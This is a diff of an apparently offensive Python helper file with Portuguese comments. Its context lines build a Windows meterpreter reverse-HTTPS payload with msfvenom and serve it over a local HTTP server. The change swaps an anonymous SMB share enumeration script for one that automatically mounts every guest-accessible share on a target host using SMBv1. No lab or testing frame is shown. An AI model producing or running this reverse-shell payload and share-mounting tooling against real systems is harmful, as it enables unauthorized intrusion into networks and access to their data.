@@ -6,34 +6,53 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-# Criando um script Python para enumerar automaticamente shares SMB abertos no alvo usando smbclient e smbmap
+# Criando um script Python para montar automaticamente shares SMB acessíveis em pastas locais
 
-script_enum_smb = """
+script_mount_smb = """
 import subprocess
+import os
 
-ip_alvo = "192.168.1.84"  # IP alvo
+ip_alvo = "192.168.1.84"  # Alvo SMB
+mount_base_dir = os.path.expanduser("~/smb_mounts")
 
-print(f"Iniciando enumeração de shares SMB no host {ip_alvo}...\\n")
+# Criar diretório base para montagens
+os.makedirs(mount_base_dir, exist_ok=True)
 
-# Primeiro, tentamos uma enumeração com smbclient (sem senha)
-print("Tentando listar shares com smbclient (acesso anônimo)...")
-smbclient_proc = subprocess.run(["smbclient", "-L", ip_alvo, "-N"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-print(smbclient_proc.stdout)
+print(f"Procurando shares SMB públicos no host {ip_alvo}...")
 
-# Agora, utilizamos o smbmap para tentar descobrir permissões automaticamente
-print("\\nExecutando smbmap para mapear shares e permissões:")
-smbmap_proc = subprocess.run(["smbmap", "-H", ip_alvo], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-print(smbmap_proc.stdout)
+# Usando smbclient para listar shares
+proc = subprocess.run(["smbclient", "-L", ip_alvo, "-N"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+output = proc.stdout
 
-print("\\nEnumeração de SMB concluída.")
+shares = []
+for line in output.splitlines():
+    if "Disk" in line and not line.startswith("\t"):
+        share_name = line.strip().split()[0]
+        shares.append(share_name)
+
+if not shares:
+    print("Nenhuma share pública encontrada.")
+else:
+    print(f"Shares encontrados: {shares}\\n")
+    for share in shares:
+        mount_point = os.path.join(mount_base_dir, share)
+        os.makedirs(mount_point, exist_ok=True)
+        print(f"Montando //{ip_alvo}/{share} em {mount_point}...")
+        mount_cmd = [
+            "sudo", "mount", "-t", "cifs", f"//{ip_alvo}/{share}", mount_point, "-o", "guest,vers=1.0"
+        ]
+        result = subprocess.run(mount_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if result.returncode == 0:
+            print(f"Share {share} montada com sucesso em {mount_point}.")
+        else:
+            print(f"Falha ao montar {share}: {result.stderr}")
+
+print("\\nScript de montagem SMB concluído.")
 """
 
-with open("/mnt/data/enum_smb_shares.py", "w") as f:
-    f.write(script_enum_smb)
+with open("/mnt/data/mount_smb_shares.py", "w") as f:
+    f.write(script_mount_smb)
 
-print("Script pronto criado como 'enum_smb_shares.py'.")
-
-
-
+print("Script pronto criado como 'mount_smb_shares.py'.")
 
 
